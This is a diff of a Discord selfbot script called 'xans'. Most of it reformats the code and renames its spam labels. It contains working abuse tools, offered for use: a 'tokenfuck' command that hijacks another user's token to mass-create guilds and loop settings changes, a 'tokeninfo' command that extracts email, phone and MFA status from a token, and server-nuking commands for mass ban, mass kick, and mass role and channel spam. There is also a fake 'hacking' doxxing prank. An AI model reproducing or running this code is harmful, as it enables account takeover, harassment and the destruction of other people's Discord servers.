-        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
-                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
-                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
+        password = [
+            'password', '123', 'mypasswordispassword', user.name + "iscool123",
+            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
+            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
+            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
+            "ilovefurries"
+        ]
         message = await ctx.send(f"`Hacking {user}...\n`")
         await asyncio.sleep(1)
-        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
-        await asyncio.sleep(1)
-        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
+        await message.edit(
+            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
+            content=
+            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
+        )
+        await asyncio.sleep(1)
+        await message.edit(
+            content=
+            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
+        )
 
 
 @xans.command(aliases=["reversesearch", "anticatfish", "catfish"])
@@ -1665,7 +1912,10 @@ async def revav(ctx, user: discord.Member = None):
     if user is None:
         user = ctx.author
     try:
-        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
+        em = discord.Embed(
+            description=
+            f"https://images.google.com/searchbyimage?image_url={user.avatar_url}"
+        )
         await ctx.send(embed=em)
     except Exception as e:
         print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
@@ -1696,14 +1946,21 @@ async def whois(ctx, *, user: discord.Member = None):
         em = discord.Embed(description=user.mention)
         em.set_author(name=str(user), icon_url=user.avatar_url)
         em.set_thumbnail(url=user.avatar_url)
-        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
+        em.add_field(
+            name="Registered", value=user.created_at.strftime(date_format))
         em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
         members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
         em.add_field(name="Join position", value=str(members.index(user) + 1))
         if len(user.roles) > 1:
             role_string = ' '.join([r.mention for r in user.roles][1:])
-            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
-        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
+            em.add_field(
+                name="Roles [{}]".format(len(user.roles) - 1),
+                value=role_string,
+                inline=False)
+        perm_string = ', '.join([
+            str(p[0]).replace("_", " ").title() for p in user.guild_permissions
+            if p[1]
+        ])
         em.add_field(name="Permissions", value=perm_string, inline=False)
         em.set_footer(text='ID: ' + str(user.id))
         return await ctx.send(embed=em)
@@ -1712,7 +1969,8 @@ async def whois(ctx, *, user: discord.Member = None):
         em = discord.Embed(description=user.mention)
         em.set_author(name=str(user), icon_url=user.avatar_url)
         em.set_thumbnail(url=user.avatar_url)
-        em.add_field(name="Created", value=user.created_at.strftime(date_format))
+        em.add_field(
+            name="Created", value=user.created_at.strftime(date_format))
         em.set_footer(text='ID: ' + str(user.id))
         return await ctx.send(embed=em)
 
@@ -1727,7 +1985,8 @@ async def quickdelete(ctx, *, args):
 async def minesweeper(ctx, size: int = 5):
     await ctx.message.delete()
     size = max(min(size, 8), 2)
-    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
+    bombs = [[random.randint(0, size - 1),
+              random.randint(0, size - 1)] for x in range(int(size - 1))]
     is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
     has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
     message = "**Click to play**:\n"
@@ -1739,7 +1998,8 @@ async def minesweeper(ctx, size: int = 5):
             else:
                 count = 0
                 for xmod, ymod in m_offets:
-                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
+                    if is_on_board(x + xmod, y + ymod) and has_bomb(
+                            x + xmod, y + ymod):
                         count += 1
                 if count != 0:
                     tile = "||{}||".format(m_numbers[count - 1])
@@ -1761,12 +2021,15 @@ async def _1337_speak(ctx, *, text):
 async def ghost(ctx):
     await ctx.message.delete()
     if config.get('password') == 'password-here':
-        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
+        print(
+            f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"
+            + Fore.RESET)
     else:
         password = config.get('password')
         with open('Images/Avatars/Transparent.png', 'rb') as f:
             try:
-                await xans.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
+                await xans.user.edit(
+                    password=password, username="ٴٴٴٴ", avatar=f.read())
             except discord.HTTPException as e:
                 print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
 
@@ -1775,7 +2038,9 @@ async def ghost(ctx):
 async def pfpsteal(ctx, user: discord.Member):
     await ctx.message.delete()
     if config.get('password') == 'password-here':
-        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
+        print(
+            f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"
+            + Fore.RESET)
     else:
         password = config.get('password')
         with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
@@ -1796,7 +2061,9 @@ async def pfpsteal(ctx, user: discord.Member):
 async def _set_pfp(ctx, *, url):
     await ctx.message.delete()
     if config.get('password') == 'password-here':
-        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
+        print(
+            f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"
+            + Fore.RESET)
     else:
         password = config.get('password')
         with open('Images/Avatars/PFP-1.png', 'wb') as f:
@@ -1828,7 +2095,8 @@ async def wyr(ctx):  # b'\xfc'
 @xans.command()
 async def topic(ctx):  # b'\xfc'
     await ctx.message.delete()
-    r = requests.get('https://www.conversationstarters.com/generator.php').content
+    r = requests.get(
+        'https://www.conversationstarters.com/generator.php').content
     soup = bs4(r, 'html.parser')
     topic = soup.find(id="random").text
     await ctx.send(topic)
@@ -1851,9 +2119,12 @@ async def hypesquad(ctx, house):
     await ctx.message.delete()
     request = requests.Session()
     headers = {
-        'Authorization': token,
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+        'Authorization':
+        token,
+        'Content-Type':
+        'application/json',
+        'User-Agent':
+        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
     }
     if house == "bravery":
         payload = {'house_id': 1}
@@ -1865,7 +2136,11 @@ async def hypesquad(ctx, house):
         houses = [1, 2, 3]
         payload = {'house_id': random.choice(houses)}
     try:
-        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
+        request.post(
+            'https://discordapp.com/api/v6/hypesquad/online',
+            headers=headers,
+            json=payload,
+            timeout=10)
     except Exception as e:
         print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
 
@@ -1874,9 +2149,12 @@ async def hypesquad(ctx, house):
 async def tokenfuck(ctx, _token):
     await ctx.message.delete()
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-        'Content-Type': 'application/json',
-        'Authorization': _token,
+        'User-Agent':
+        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
+        'Content-Type':
+        'application/json',
+        'Authorization':
+        _token,
     }
     request = requests.Session()
     payload = {
@@ -1897,14 +2175,20 @@ async def tokenfuck(ctx, _token):
     guild = {
         'channels': None,
         'icon': None,
-        'name': "xans",
+        'name': "XANS",
         'region': "europe"
     }
     for _i in range(50):
-        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
+        requests.post(
+            'https://discordapp.com/api/v6/guilds',
+            headers=headers,
+            json=guild)
     while True:
         try:
-            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
+            request.patch(
+                "https://canary.discordapp.com/api/v6/users/@me/settings",
+                headers=headers,
+                json=payload)
         except Exception as e:
             print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
         else:
@@ -1919,29 +2203,27 @@ async def tokenfuck(ctx, _token):
         }
         while True:
             try:
-                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
-                              timeout=10)
+                request.patch(
+                    "https://canary.discordapp.com/api/v6/users/@me/settings",
+                    headers=headers,
+                    json=setting,
+                    timeout=10)
             except Exception as e:
                 print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
             else:
                 break
 
 
-@xans.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
+@xans.command(
+    aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
 async def fakenet(ctx, _type=None, *, name=None):
     await ctx.message.delete()
     if _type is None or name is None:
         await ctx.send("missing parameters")
         return
     ID = random.randrange(10000000, 90000000)
-    avaliable = [
-        'battlenet',
-        'skype',
-        'lol']
-    payload = {
-        'name': name,
-        'visibility': 1
-    }
+    avaliable = ['battlenet', 'skype', 'lol']
+    payload = {'name': name, 'visibility': 1}
     token = config.get('token')
     headers = {
         'Authorization': token,
@@ -1953,61 +2235,85 @@ async def fakenet(ctx, _type=None, *, name=None):
     elif _type not in avaliable:
         await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after=3)
         return
-    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}',
-                     data=json.dumps(payload), headers=headers)
+    r = requests.put(
+        f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}',
+        data=json.dumps(payload),
+        headers=headers)
     if r.status_code == 200:
-        await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
+        await ctx.send(
+            f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`",
+            delete_after=3)
     else:
         await ctx.send(
-            '**[ERROR]** `xans Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')
+            '**[ERROR]** `xans Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`'
+        )
 
 
 @xans.command(aliases=['tokinfo', 'tdox'])
 async def tokeninfo(ctx, _token):
     await ctx.message.delete()
-    headers = {
-        'Authorization': _token,
-        'Content-Type': 'application/json'
-    }
+    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
     try:
-        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+        res = requests.get(
+            'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
         res = res.json()
         user_id = res['id']
         locale = res['locale']
         avatar_id = res['avatar']
         language = languages.get(locale)
-        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
-            '%d-%m-%Y %H:%M:%S UTC')
+        creation_date = datetime.datetime.utcfromtimestamp(
+            ((int(user_id) >> 22) + 1420070400000) /
+            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
     except KeyError:
         headers = {
             'Authorization': "Bot " + _token,
             'Content-Type': 'application/json'
         }
         try:
-            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+            res = requests.get(
+                'https://canary.discordapp.com/api/v6/users/@me',
+                headers=headers)
             res = res.json()
             user_id = res['id']
             locale = res['locale']
             avatar_id = res['avatar']
             language = languages.get(locale)
-            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
-                '%d-%m-%Y %H:%M:%S UTC')
+            creation_date = datetime.datetime.utcfromtimestamp(
+                ((int(user_id) >> 22) + 1420070400000) /
+                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
             em = discord.Embed(
-                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
+                description=
+                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
+            )
             fields = [
-                {'name': 'Flags', 'value': res['flags']},
-                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
-                {'name': 'Verified', 'value': res['verified']},
+                {
+                    'name': 'Flags',
+                    'value': res['flags']
+                },
+                {
+                    'name': 'Local language',
+                    'value': res['locale'] + f"{language}"
+                },
+                {
+                    'name': 'Verified',
+                    'value': res['verified']
+                },
             ]
             for field in fields:
                 if field['value']:
-                    em.add_field(name=field['name'], value=field['value'], inline=False)
-                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
+                    em.add_field(
+                        name=field['name'], value=field['value'], inline=False)
+                    em.set_thumbnail(
+                        url=
+                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
+                    )
             return await ctx.send(embed=em)
         except KeyError:
             await ctx.send("Invalid token")
     em = discord.Embed(
-        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
+        description=
+        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
+    )
     nitro_type = "None"
     if "premium_type" in res:
         if res['premium_type'] == 2:
@@ -2015,17 +2321,38 @@ async def tokeninfo(ctx, _token):
         elif res['premium_type'] == 1:
             nitro_type = "Nitro Classic"
     fields = [
-        {'name': 'Phone', 'value': res['phone']},
-        {'name': 'Flags', 'value': res['flags']},
-        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
-        {'name': 'MFA', 'value': res['mfa_enabled']},
-        {'name': 'Verified', 'value': res['verified']},
-        {'name': 'Nitro', 'value': nitro_type},
+        {
+            'name': 'Phone',
+            'value': res['phone']
+        },
+        {
+            'name': 'Flags',
+            'value': res['flags']
+        },
+        {
+            'name': 'Local language',
+            'value': res['locale'] + f"{language}"
+        },
+        {
+            'name': 'MFA',
+            'value': res['mfa_enabled']
+        },
+        {
+            'name': 'Verified',
+            'value': res['verified']
+        },
+        {
+            'name': 'Nitro',
+            'value': nitro_type
+        },
     ]
     for field in fields:
         if field['value']:
-            em.add_field(name=field['name'], value=field['value'], inline=False)
-            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
+            em.add_field(
+                name=field['name'], value=field['value'], inline=False)
+            em.set_thumbnail(
+                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
+            )
     return await ctx.send(embed=em)
 
 
@@ -2054,12 +2381,16 @@ async def copy(ctx):  # b'\xfc'
 @xans.command()
 async def poll(ctx, *, arguments):
     await ctx.message.delete()
-    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
-        "msg:", "")
-    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
-        "1:", "")
-    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
-    message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
+    message = discord.utils.escape_markdown(
+        arguments[str.find(arguments, "msg:"):str.
+                  find(arguments, "1:")]).replace("msg:", "")
+    option1 = discord.utils.escape_markdown(
+        arguments[str.find(arguments, "1:"):str.
+                  find(arguments, "2:")]).replace("1:", "")
+    option2 = discord.utils.escape_markdown(
+        arguments[str.find(arguments, "2:"):]).replace("2:", "")
+    message = await ctx.send(
+        f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
     await message.add_reaction('🅰')
     await message.add_reaction('🅱')
 
@@ -2115,17 +2446,16 @@ async def destroy(ctx):
     try:
         await ctx.guild.edit(
             name=RandString(),
-            description="xans LOL",
-            reason="xans LOL",
+            description="XANS",
+            reason="XANS",
             icon=None,
-            banner=None
-        )
+            banner=None)
     except:
         pass
     for _i in range(250):
-        await ctx.guild.create_text_channel(name="exeter")
+        await ctx.guild.create_text_channel(name="XANS")
     for _i in range(250):
-        await ctx.guild.create_role(name="exeter", color=RandomColor())
+        await ctx.guild.create_role(name="XANS", color=RandomColor())
 
 
 @xans.command(aliases=["banwave", "banall", "etb"])
@@ -2134,7 +2464,7 @@ async def massban(ctx):
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.ban(reason="exeter")
+            await user.ban(reason="XANS")
         except:
             pass
 
@@ -2154,7 +2484,7 @@ async def masskick(ctx):
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.kick(reason="exeter")
+            await user.kick(reason="XANS")
         except:
             pass
 
@@ -2164,7 +2494,7 @@ async def massrole(ctx):
     await ctx.message.delete()
     for _i in range(250):
         try:
-            await ctx.guild.create_role(name="exeter", color=RandomColor())
+            await ctx.guild.create_role(name="XANS", color=RandomColor())
         except:
             return
 
@@ -2174,7 +2504,7 @@ async def spamchannels(ctx):
     await ctx.message.delete()
     for _i in range(250):
         try:
-            await ctx.guild.create_text_channel(name="exeter")
+            await ctx.guild.create_text_channel(name="XANS RAN THIS SHIT")
         except:
             return
 
@@ -2231,7 +2561,8 @@ async def dm(ctx, user: discord.Member, *, message):
             pass
 
 
-@xans.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
+@xans.command(
+    name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
 async def _get_color(ctx, *, color: discord.Colour):
     await ctx.message.delete()
     file = io.BytesIO()
@@ -2267,10 +2598,15 @@ async def ping(ctx):
 async def serverinfo(ctx):
     await ctx.message.delete()
     date_format = "%a, %d %b %Y %I:%M %p"
-    embed = discord.Embed(title=f"{ctx.guild.name}",
-                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
-                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
-    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
+    embed = discord.Embed(
+        title=f"{ctx.guild.name}",
+        description=
+        f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
+        timestamp=datetime.datetime.utcnow(),
+        color=discord.Color.blue())
+    embed.add_field(
+        name="Server created at",
+        value=f"{ctx.guild.created_at.strftime(date_format)}")
     embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
     embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
     embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
@@ -2284,84 +2620,122 @@ async def wizz(ctx):
     if isinstance(ctx.message.channel, discord.TextChannel):
         print("hi")
         initial = random.randrange(0, 60)
-        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
+        message = await ctx.send(
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
+            content=
+            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`"
+        )
     elif isinstance(ctx.message.channel, discord.DMChannel):
         initial = random.randrange(1, 60)
         message = await ctx.send(
-            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
+            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
+            content=
+            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
+            content=
+            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
+            content=
+            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
+            content=
+            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
+        )
     elif isinstance(ctx.message.channel, discord.GroupChannel):
         initial = random.randrange(1, 60)
-        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
+        message = await ctx.send(
+            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
+            content=
+            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
+        )
         await asyncio.sleep(1)
         await message.edit(
-            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
+            content=
+            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
+        )
         await asyncio.sleep(1)
         await message.edit(
